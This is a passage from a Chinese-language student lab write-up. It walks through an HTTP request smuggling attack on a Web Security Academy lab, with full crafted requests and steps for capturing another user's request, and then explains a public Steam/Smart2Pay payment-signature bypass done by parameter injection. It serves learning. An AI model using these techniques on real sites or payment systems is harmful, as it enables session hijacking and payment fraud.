+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a7b00a70354238e80186777001600fe.web-security-academy.net/post?postId=9
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=7dLyrRyuO1exFvF0Rj8M0zwyP8rQlx34&amp;postId=9&amp;comment=first+comment&amp;name=yks&amp;email=1%401&amp;website=https%3A%2F%2F0a7b00a70354238e80186777001600fe.web-security-academy.net%2Fpost%3FpostId%3D9
+</code></pre>
+<p>现在，我们把从上面这个请求填充到攻击模板里。</p>
+<h5 id="组装攻击包">组装攻击包<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#组装攻击包" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
+<p>在 Burp Repeater 中，构造以下请求。</p>
+<pre><code>POST / HTTP/1.1
+Host: 0a7b00a70354238e80186777001600fe.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1185
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Host: 0a7b00a70354238e80186777001600fe.web-security-academy.net
+Cookie: session=TlR4dPRlOnv8IfN5Fr1SCJ6KYfAuU9LG
+Content-Length: 600
+Cache-Control: max-age=0
+Sec-Ch-Ua: &quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: &quot;macOS&quot;
+Accept-Language: zh-CN,zh;q=0.9
+Origin: https://0a7b00a70354238e80186777001600fe.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a7b00a70354238e80186777001600fe.web-security-academy.net/post?postId=9
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=7dLyrRyuO1exFvF0Rj8M0zwyP8rQlx34&amp;postId=9&amp;name=yks&amp;email=1%401&amp;website=https%3A%2F%2F0a7b00a70354238e80186777001600fe.web-security-academy.net%2Fpost%3FpostId%3D9&amp;comment=
+</code></pre>
+<p>差别就在最后改成了<code>comment=</code>结尾，这样只要另一个新用户</p>
+<h5 id="计算并填入content-length">计算并填入<code>Content-Length</code><a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#计算并填入content-length" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
+<p>这是最后也是最关键的一步：</p>
+<ul>
+<li><strong>内部 <code>Content-Length</code></strong>: 设置为 <code>600</code>，这个值足够大即可。</li>
+<li><strong>外部 <code>Content-Length</code></strong>:
+<ol>
+<li>在 Burp Repeater 中，用鼠标<strong>选中上面的整个请求体</strong>（从第一行的 <code>0</code> 开始，一直到最末尾的 <code>comment=</code>）。</li>
+<li>查看 Repeater 窗口右下角显示的<strong>字节数</strong>（Length）。</li>
+<li>将这个数字填入外层请求的 <code>Content-Length: [此处填精确的字节数]</code> 位置。这个数是1185</li>
+</ol>
+</li>
+</ul>
+<h5 id="执行攻击">执行攻击<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#执行攻击" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
+<ol>
+<li>点击 <strong>Send</strong> 发送这个构造好的请求（可以快速发送两次以确保成功）。</li>
+<li>立即切换到浏览器，<strong>刷新</strong> <code>postId=9</code> 的那个帖子页面。</li>
+<li>再次<strong>刷新</strong>页面，就能在评论区看到浏览器刚才发送的 GET 请求内容了。</li>
+</ol>
+<p>![image-20250716224144043](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250716224144043.png)</p>
+<h2 id="bonus漏洞报告阅读">bonus漏洞报告阅读<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#bonus漏洞报告阅读" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h4 id="漏洞复述">漏洞复述<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#漏洞复述" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
+<p>这个漏洞的核心是，攻击者可以利用 Steam 支付合作方 (Smart2Pay) 服务器的一个验证缺陷，实现“支付小钱、充值大钱”的目的。</p>
+<p>整个过程可以分解为以下几个关键点：</p>
+<ol>
+<li><strong>有缺陷的签名机制：</strong> 为了防止数据在传输中被篡改，服务器会用一个 <code>Hash</code> 签名来校验请求的真伪。但这个签名的生成方式存在漏洞：它把请求里的所有“参数名”和“参数值”<strong>不加区分地直接拼接成一个长字符串</strong>，然后对这个字符串进行加密计算。例如，<code>Amount=2000</code> 和 <code>CustomerEmail=abc@email.com</code> 会被拼接成 <code>Amount2000CustomerEmailabc@email.com</code> 这样一长串，再去生成签名。</li>
+<li><strong>利用邮箱进行“参数注入”：</strong> 攻击者发现了这个机制的弱点。他利用了 <code>CustomerEmail</code>（用户邮箱）这个可以由自己控制的参数字段，往里面塞入了将来能被服务器“误读”成新参数的文本。
+<ul>
+<li><strong>第一步：</strong> 他先把自己的邮箱改成类似 <code>brixamount100abc@email.com</code> 的样子。</li>
+</ul>
+</li>
+<li><strong>拦截并篡改请求：</strong> 当他发起一笔正常充值（比如金额为 <code>2000</code>）时，他会拦截发往支付服务器的数据包。然后进行两处巧妙的修改：
+<ul>
+<li><strong>修改金额参数：</strong> 他把 <code>Amount=2000</code> 改成 <code>Amount2=000</code>。对于签名机制来说，拼接后的字符串依然是 <code>Amount2000</code>，<strong>内容完全没变</strong>。</li>
+<li><strong>修改邮箱参数：</strong> 他把 <code>CustomerEmail=brixamount100abc@...</code> 改成 <code>CustomerEmail=brix&amp;amount=100&amp;ab=c@...</code>。同样，对于签名机制，这串字符的<strong>内容也完全没变</strong>。</li>
+</ul>
+</li>
+<li><strong>成功绕过校验并篡改金额：</strong>
+<ul>
+<li><strong>对于签名系统：</strong> 由于用于计算签名的长字符串内容分毫未差，所以他修改后的请求所附带的原始签名依然有效。服务器认为“这个请求是合法的，没有被篡改”。</li>
+<li><strong>对于支付系统：</strong> 当服务器通过验证，开始处理这笔支付时，它会按照标准的 <code>&amp;</code> 符号来切分参数。这时，它就会把 <code>CustomerEmail=brix&amp;amount=100&amp;...</code> 这段数据，解析成三个独立的参数：<code>CustomerEmail=brix</code>、<code>amount=100</code> 和 <code>ab=c@...</code>。服务器因此识别到了一个<strong>新的、金额为 <code>100</code> 的 <code>amount</code> 参数</strong>，并将其作为本次交易的实际支付金额。</li>
+</ul>
+</li>
+</ol>
+<p><strong>最终结果就是：</strong> 攻击者发起了一个看似是 2000 元的充值请求，并且该请求通过了服务器的合法性校验，但实际支付时，服务器却因为被注入的新参数，只要求他支付 100 所代表的极小金额。支付成功后，Steam 系统会根据原始请求，为他的账户增加 2000 元的钱包余额，攻击者从而凭空获利。</p>
+<h3 id="1-漏洞成因简述">1. 漏洞成因简述<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-漏洞成因简述" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>这个漏洞的根本原因在于 Steam 与其支付提供商 Smart2Pay 之间的数据校验机制存在缺陷。具体来说，当用户发起一笔交易时，后端系统为了防止数据被篡改，会生成一个<code>Hash</code>签名。这个签名的生成方式是将请求中的所有参数名和参数值<strong>简单地拼接</strong>在一起，然后进行哈希计算。</p>
+<p>![image-20250703154349604](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250703154349604.png)</p>
+<p>攻击者发现，他可以通过构造一个包含特定字符串（如 <code>amount100</code>）的电子邮箱地址，来巧妙地操纵这个拼接过程。这个特制的邮箱地址，在后续的拦截和修改中，可以被拆解成一个新的、有效的支付金额参数（例如 <code>&amp;amount=100&amp;</code>）。</p>
+<p>![image-20250703155237118](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250703155237118.png)</p>
+<p>由于这个新的金额参数是“凭空”注入的，而原有的金额参数名被轻微修改（例如 <code>Amount</code> 变成 <code>Amount2</code>），导致拼接后的字符串整体上没有变化，因此计算出的<code>Hash</code>签名也完全一致。这就成功骗过了服务器的签名校验，让服务器误以为这是一笔合法的、金额被修改过的交易请求。</p>
+<p>![image-20250703155138811](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250703155138811.png)</p>
+<p>简单来说，<strong>漏洞的核心在于服务器校验签名的逻辑过于简单，仅仅依赖字符串拼接，而没有对参数的键值对进行严格、独立的解析和验证，从而让攻击者有机会通过污染一个参数（电子邮箱）来注入另一个关键参数（支付金额）。</strong></p>
+<h3 id="2-绕过服务器校验的原理">2. 绕过服务器校验的原理<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2-绕过服务器校验的原理" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>绕过服务器校验的原理可以概括为**“参数注入攻击” **，其具体步骤和原理如下：</p>
+<ol>
+<li><strong>签名机制：</strong> 攻击者首先分析出签名 <code>Hash</code> 是由所有参数（键和值）按顺序拼接成的单一字符串计算得来的。例如，<code>hash(&quot;Key1Value1Key2Value2...&quot;)</code>。</li>
+<li><strong>构造特殊的用户邮箱：</strong> 攻击者将自己的 Steam 账户邮箱修改为类似于 <code>brixamount100abc@email.com</code> 的格式。这里的 <code>amount100</code> 是关键的 payload。</li>
+<li><strong>拦截并修改请求：</strong> 在支付过程中，攻击者拦截了发送给 Smart2Pay 服务器的 <code>POST</code> 请求。</li>
+<li><strong>操纵参数拼接：</strong>
+<ul>
+<li><strong>原始请求拼接的字符串（部分）：</strong> <code>...Amount2000...CustomerEmailbrixamount100abc@email.com...</code></li>
+<li><strong>攻击者修改请求：</strong>
+<ul>
+<li>他将原始的 <code>Amount=2000</code> 修改为 <code>Amount2=000</code>。这样一来，在字符串拼接时，这部分仍然是 <code>Amount2000</code>，没有改变。</li>
+<li>他将 <code>CustomerEmail=brixamount100abc%40email.com</code> 修改为 <code>CustomerEmail=brix&amp;amount=100&amp;ab=c%40email.com</code> (其中 <code>%40</code> 是 <code>@</code> 的 URL 编码)。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>实现校验绕过：</strong>
+<ul>
+<li><strong>修改后的请求拼接的字符串（部分）：</strong> <code>...Amount2000...CustomerEmailbrix&amp;amount=100&amp;ab=c@email.com...</code></li>
+<li>从服务器接收和解析的角度看，由于 <code>&amp;</code> 是参数分隔符，原来的 <code>CustomerEmail</code> 字段现在被解析成了三个独立的参数：
+<ul>
+<li><code>CustomerEmail=brix</code></li>
+<li><code>amount=100</code>  <strong><span>⇐</span> 成功注入了新的金额参数</strong></li>
+<li><code>ab=c@email.com</code></li>
+</ul>
+</li>
+<li>然而，从<strong>签名校验</strong>的角度看，用于生成 <code>Hash</code> 的原始拼接字符串<strong>几乎没有变化</strong>。攻击者只是巧妙地移动了字符，并利用 <code>&amp;</code> 符号的特殊含义，但并未改变参与哈希计算的整个字符串的内容。因此，原始的 <code>Hash</code> 值依然有效。</li>
+</ul>
+</li>
+</ol>
+<p>最终，支付网关 Smart2Pay 的服务器在验证签名时，认为请求是合法的。但在处理支付逻辑时，它识别到了被注入的 <code>amount=100</code> 这个参数，并将其作为实际支付金额。这样，攻击者就能以一个极低的金额（例如报告中提到的1美元，对应新注入的金额）完成一笔在 Steam 系统中记录为更高金额（例如原始的2000 PLN）的充值。</p>
+<p>参考视频<a href="https://www.bilibili.com/video/BV163411k7Di/?spm_id_from=333.337.search-card.all.click&amp;vd_source=f87bf786d8d1f18597fcc69be52fffbe" class="external">https://www.bilibili.com/video/BV163411k7Di/?spm_id_from=333.337.search-card.all.click&amp;vd_source=f87bf786d8d1f18597fcc69be52fffbe<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></p></article><hr/><div class="page-footer"></div></div><div class="right sidebar"><div class="graph"><h3>Graph View</h3><div class="graph-outer"><div class="graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:1,&quot;scale&quot;:1.1,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.3,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:false,&quot;enableRadial&quot;:false}"></div><button class="global-graph-icon" aria-label="Global Graph"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 55 55" fill="currentColor" xml:space="preserve"><path d="M49,0c-3.309,0-6,2.691-6,6c0,1.035,0.263,2.009,0.726,2.86l-9.829,9.829C32.542,17.634,30.846,17,29,17
+                s-3.542,0.634-4.898,1.688l-7.669-7.669C16.785,10.424,17,9.74,17,9c0-2.206-1.794-4-4-4S9,6.794,9,9s1.794,4,4,4
+                c0.74,0,1.424-0.215,2.019-0.567l7.669,7.669C21.634,21.458,21,23.154,21,25s0.634,3.542,1.688,4.897L10.024,42.562
+                C8.958,41.595,7.549,41,6,41c-3.309,0-6,2.691-6,6s2.691,6,6,6s6-2.691,6-6c0-1.035-0.263-2.009-0.726-2.86l12.829-12.829
+                c1.106,0.86,2.44,1.436,3.898,1.619v10.16c-2.833,0.478-5,2.942-5,5.91c0,3.309,2.691,6,6,6s6-2.691,6-6c0-2.967-2.167-5.431-5-5.91
+                v-10.16c1.458-0.183,2.792-0.759,3.898-1.619l7.669,7.669C41.215,39.576,41,40.26,41,41c0,2.206,1.794,4,4,4s4-1.794,4-4
+                s-1.794-4-4-4c-0.74,0-1.424,0.215-2.019,0.567l-7.669-7.669C36.366,28.542,37,26.846,37,25s-0.634-3.542-1.688-4.897l9.665-9.665
+                C46.042,11.405,47.451,12,49,12c3.309,0,6-2.691,6-6S52.309,0,49,0z M11,9c0-1.103,0.897-2,2-2s2,0.897,2,2s-0.897,2-2,2
+                S11,10.103,11,9z M6,51c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S8.206,51,6,51z M33,49c0,2.206-1.794,4-4,4s-4-1.794-4-4
+                s1.794-4,4-4S33,46.794,33,49z M29,31c-3.309,0-6-2.691-6-6s2.691-6,6-6s6,2.691,6,6S32.309,31,29,31z M47,41c0,1.103-0.897,2-2,2
+                s-2-0.897-2-2s0.897-2,2-2S47,39.897,47,41z M49,10c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S51.206,10,49,10z"></path></svg></button></div><div class="global-graph-outer"><div class="global-graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:-1,&quot;scale&quot;:0.9,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.2,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:true,&quot;enableRadial&quot;:true}"></div></div></div><div class="toc desktop-only"><button type="button" class="toc-header" aria-controls="toc-content" aria-expanded="true"><h3>Table of Contents</h3><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><ul class="toc-content overflow" id="list-1"><li class="depth-0"><a href="#lab1web-yekaisen" data-for="lab1web-yekaisen">Lab1Web Yekaisen</a></li><li class="depth-1"><a href="#task1" data-for="task1">task1</a></li><li class="depth-2"><a href="#二这些地址是服务器的真实地址吗" data-for="二这些地址是服务器的真实地址吗">二、这些地址是服务器的真实地址吗？</a></li><li class="depth-2"><a href="#三现象原因分析问题出在哪一层" data-for="三现象原因分析问题出在哪一层">三、现象原因分析：问题出在哪一层？</a></li><li class="depth-2"><a href="#总结" data-for="总结">总结</a></li><li class="depth-1"><a href="#task2" data-for="task2">task2</a></li><li class="depth-2"><a href="#api接口和参数分析" data-for="api接口和参数分析">API接口和参数分析</a></li><li class="depth-2"><a href="#返回信息分析" data-for="返回信息分析">返回信息分析</a></li><li class="depth-2"><a href="#结论与后续操作" data-for="结论与后续操作">结论与后续操作</a></li><li class="depth-1"><a href="#task3" data-for="task3">task3</a></li><li class="depth-2"><a href="#1-http-请求走私漏洞原理" data-for="1-http-请求走私漏洞原理">1. HTTP 请求走私漏洞原理</a></li><li class="depth-1"><a href="#bonus漏洞报告阅读" data-for="bonus漏洞报告阅读">bonus漏洞报告阅读</a></li><li class="depth-2"><a href="#1-漏洞成因简述" data-for="1-漏洞成因简述">1. 漏洞成因简述</a></li><li class="depth-2"><a href="#2-绕过服务器校验的原理" data-for="2-绕过服务器校验的原理">2. 绕过服务器校验的原理</a></li><li class="overflow-end"></li></ul></div></div><footer class><p>Created with <a href="https://quartz.jzhao.xyz/">Quartz v4.5.1</a> © 2025</p><ul><li><a href="https://github.com/jackyzha0/quartz">GitHub</a></li><li><a href="https://discord.gg/cRFFHYye7t">Discord Community</a></li></ul></footer></div></div></body><script type="application/javascript">function n(){let t=this.parentElement;t.classList.toggle("is-collapsed");let e=t.getElementsByClassName("callout-content")[0];if(!e)return;let l=t.classList.contains("is-collapsed");e.style.gridTemplateRows=l?"0fr":"1fr"}function c(){let t=document.getElementsByClassName("callout is-collapsible");for(let e of t){let l=e.getElementsByClassName("callout-title")[0],s=e.getElementsByClassName("callout-content")[0];if(!l||!s)continue;l.addEventListener("click",n),window.addCleanup(()=>l.removeEventListener("click",n));let o=e.classList.contains("is-collapsed");s.style.gridTemplateRows=o?"0fr":"1fr"}}document.addEventListener("nav",c);
+</script><script type="module">function f(i,e){if(!i)return;function r(o){o.target===this&&(o.preventDefault(),o.stopPropagation(),e())}function t(o){o.key.startsWith("Esc")&&(o.preventDefault(),e())}i?.addEventListener("click",r),window.addCleanup(()=>i?.removeEventListener("click",r)),document.addEventListener("keydown",t),window.addCleanup(()=>document.removeEventListener("keydown",t))}function y(i){for(;i.firstChild;)i.removeChild(i.firstChild)}var h=class{constructor(e,r){this.container=e;this.content=r;this.setupEventListeners(),this.setupNavigationControls(),this.resetTransform()}isDragging=!1;startPan={x:0,y:0};currentPan={x:0,y:0};scale=1;MIN_SCALE=.5;MAX_SCALE=3;cleanups=[];setupEventListeners(){let e=this.onMouseDown.bind(this),r=this.onMouseMove.bind(this),t=this.onMouseUp.bind(this),o=this.resetTransform.bind(this);this.container.addEventListener("mousedown",e),document.addEventListener("mousemove",r),document.addEventListener("mouseup",t),window.addEventListener("resize",o),this.cleanups.push(()=>this.container.removeEventListener("mousedown",e),()=>document.removeEventListener("mousemove",r),()=>document.removeEventListener("mouseup",t),()=>window.removeEventListener("resize",o))}cleanup(){for(let e of this.cleanups)e()}setupNavigationControls(){let e=document.createElement("div");e.className="mermaid-controls";let r=this.createButton("+",()=>this.zoom(.1)),t=this.createButton("-",()=>this.zoom(-.1)),o=this.createButton("Reset",()=>this.resetTransform());e.appendChild(t),e.appendChild(o),e.appendChild(r),this.container.appendChild(e)}createButton(e,r){let t=document.createElement("button");return t.textContent=e,t.className="mermaid-control-button",t.addEventListener("click",r),window.addCleanup(()=>t.removeEventListener("click",r)),t}onMouseDown(e){e.button===0&&(this.isDragging=!0,this.startPan={x:e.clientX-this.currentPan.x,y:e.clientY-this.currentPan.y},this.container.style.cursor="grabbing")}onMouseMove(e){this.isDragging&&(e.preventDefault(),this.currentPan={x:e.clientX-this.startPan.x,y:e.clientY-this.startPan.y},this.updateTransform())}onMouseUp(){this.isDragging=!1,this.container.style.cursor="grab"}zoom(e){let r=Math.min(Math.max(this.scale+e,this.MIN_SCALE),this.MAX_SCALE),t=this.content.getBoundingClientRect(),o=t.width/2,n=t.height/2,c=r-this.scale;this.currentPan.x-=o*c,this.currentPan.y-=n*c,this.scale=r,this.updateTransform()}updateTransform(){this.content.style.transform=`translate(${this.currentPan.x}px, ${this.currentPan.y}px) scale(${this.scale})`}resetTransform(){this.scale=1;let e=this.content.querySelector("svg");this.currentPan={x:e.getBoundingClientRect().width/2,y:e.getBoundingClientRect().height/2},this.updateTransform()}},C=["--secondary","--tertiary","--gray","--light","--lightgray","--highlight","--dark","--darkgray","--codeFont"],E;document.addEventListener("nav",async()=>{let e=document.querySelector(".center").querySelectorAll("code.mermaid");if(e.length===0)return;E||=await import("https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.4.0/mermaid.esm.min.mjs");let r=E.default,t=new WeakMap;for(let n of e)t.set(n,n.innerText);async function o(){for(let s of e){s.removeAttribute("data-processed");let a=t.get(s);a&&(s.innerHTML=a)}let n=C.reduce((s,a)=>(s[a]=window.getComputedStyle(document.documentElement).getPropertyValue(a),s),{}),c=document.documentElement.getAttribute("saved-theme")==="dark";r.initialize({startOnLoad:!1,securityLevel:"loose",theme:c?"dark":"base",themeVariables:{fontFamily:n["--codeFont"],primaryColor:n["--light"],primaryTextColor:n["--darkgray"],primaryBorderColor:n["--tertiary"],lineColor:n["--darkgray"],secondaryColor:n["--secondary"],tertiaryColor:n["--tertiary"],clusterBkg:n["--light"],edgeLabelBackground:n["--highlight"]}}),await r.run({nodes:e})}await o(),document.addEventListener("themechange",o),window.addCleanup(()=>document.removeEventListener("themechange",o));for(let n=0;n<e.length;n++){let v=function(){let g=l.querySelector("#mermaid-space"),m=l.querySelector(".mermaid-content");if(!m)return;y(m);let w=c.querySelector("svg").cloneNode(!0);m.appendChild(w),l.classList.add("active"),g.style.cursor="grab",u=new h(g,m)},M=function(){l.classList.remove("active"),u?.cleanup(),u=null},c=e[n],s=c.parentElement,a=s.querySelector(".clipboard-button"),d=s.querySelector(".expand-button"),p=window.getComputedStyle(a),L=a.offsetWidth+parseFloat(p.marginLeft||"0")+parseFloat(p.marginRight||"0");d.style.right=`calc(${L}px + 0.3rem)`,s.prepend(d);let l=s.querySelector("#mermaid-container");if(!l)return;let u=null;d.addEventListener("click",v),f(l,M),window.addCleanup(()=>{u?.cleanup(),d.removeEventListener("click",v)})}});
+</script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/copy-tex.min.js" type="application/javascript"></script><script type="application/javascript">
+        const socket = new WebSocket('ws://localhost:3001')
+        // reload(true) ensures resources like images and scripts are fetched again in firefox
+        socket.addEventListener('message', () => document.location.reload(true))
+      </script><script src="../postscript.js" type="module"></script></html>
